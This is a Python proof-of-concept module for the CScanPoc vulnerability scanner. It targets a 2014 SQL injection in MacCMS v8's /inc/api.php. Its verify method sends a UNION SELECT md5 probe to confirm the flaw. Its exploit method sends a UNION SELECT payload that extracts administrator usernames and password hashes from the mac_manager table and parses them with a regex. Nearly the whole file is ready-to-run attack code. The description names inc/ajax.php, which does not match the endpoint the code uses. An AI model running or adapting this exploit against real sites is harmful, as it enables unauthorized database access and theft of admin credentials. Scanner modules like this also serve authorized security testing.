# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'MacCMS_0003'  # 平台漏洞编号，留空
    name = 'MacCMS v8 /inc/api.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''
        MacCMS V8版本中inc/ajax.php文件ids参数未经过过滤带入SQL语句，导致SQL注入漏洞的发生.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=066130'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MacCMS'  # 漏洞应用名称
    product_version = 'v8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4bf7f9f1-f29d-4115-abf2-319f9c7b373f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            vul_url = '{target}/inc/api.php?ac=videolist&t=0&pg=0&ids=1'.format(
                target=self.target)
            payload = '%29%20Union%20sElect/**/md5(602589),' + \
                'NULL,' * 48 + 'NULL%23'
            content = urllib.request.urlopen(vul_url + payload).read()

            if '243d353b44e167073a40f8bf33a02adb' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            vul_url = '{target}/inc/api.php?ac=videolist&t=0&pg=0&ids=1'.format(
                target=self.target)
            payload = '%29%20Union%20sElect/**/concat(m_name,0x3a3a,m_password),' + \
                      'NULL,' * 48 + 'NULL%20from%20mac_manager%23'
            match_data = re.compile('([\d\w]+)::([\w\d]{32})')

            response = urllib.request.urlopen(vul_url + payload).read()
            res = match_data.findall(response)

            if res:
                username = res[0][0]
                password = res[0][1]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的管理员用户名为{username} 管理员密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
